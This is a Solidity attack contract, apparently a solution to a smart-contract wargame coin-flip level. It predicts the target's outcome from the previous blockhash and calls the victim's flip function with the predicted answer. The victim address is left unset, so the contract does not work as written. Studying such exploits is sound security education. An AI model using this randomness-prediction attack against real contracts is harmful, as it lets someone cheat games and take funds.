//SPDX-License-Identifier: MIT

pragma solidity 0.8.20;

contract AttackContract {
    uint256 FACTOR;
    address victim;

    constructor() {
        FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
        //victim = the address of the instance;
    }

    function attack() public {
        (bool success, ) = victim.call(
            abi.encodeWithSignature("flip(bool)", flip())
        );
    }

    function flip() public returns (bool) {
        uint256 blockValue = uint256(blockhash(block.number - 1));
        uint256 coinFlip = blockValue / FACTOR;
        bool side = coinFlip == 1 ? true : false;
        return side;
    }
}
